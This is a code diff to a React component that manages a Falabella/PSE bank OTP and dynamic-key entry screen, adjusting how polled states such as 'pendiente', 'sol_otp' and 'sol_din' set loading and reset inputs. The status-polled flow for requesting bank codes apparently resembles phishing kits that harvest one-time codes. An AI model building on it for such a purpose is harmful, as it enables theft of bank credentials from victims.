@@ -165,6 +165,7 @@ const OtpFalabellaPse = () => {
   const showOtpInlineError = () => {
     esperandoRespuestaTrasEnviarRef.current = false;
     otpTrasEnviarVioPendienteRef.current = false;
+    envioOtpEnCursoRef.current = false;
     stopPolling();
     setIsLoading(false);
     setDynamicKey("");
@@ -310,19 +311,24 @@ const OtpFalabellaPse = () => {
         .toLowerCase();
       if (!estadoActual) return;
 
-      if (
-        esperandoRespuestaTrasEnviarRef.current &&
-        estadoActual === "pendiente"
-      ) {
+      if (estadoActual === "pendiente") {
         otpTrasEnviarVioPendienteRef.current = true;
+        if (esperandoRespuestaTrasEnviarRef.current) {
+          setIsLoading(true);
+        }
+        return;
       }
 
       switch (estadoActual) {
         case "sol_otp":
-          if (esperandoRespuestaTrasEnviarRef.current) {
+          if (esperandoRespuestaTrasEnviarRef.current && !otpTrasEnviarVioPendienteRef.current) {
             break;
           }
+          esperandoRespuestaTrasEnviarRef.current = false;
+          otpTrasEnviarVioPendienteRef.current = false;
           setIsLoading(false);
+          setDynamicKey("");
+          dismissInlineAlertIfOpen();
           break;
         case "sol_din":
           esperandoRespuestaTrasEnviarRef.current = false;
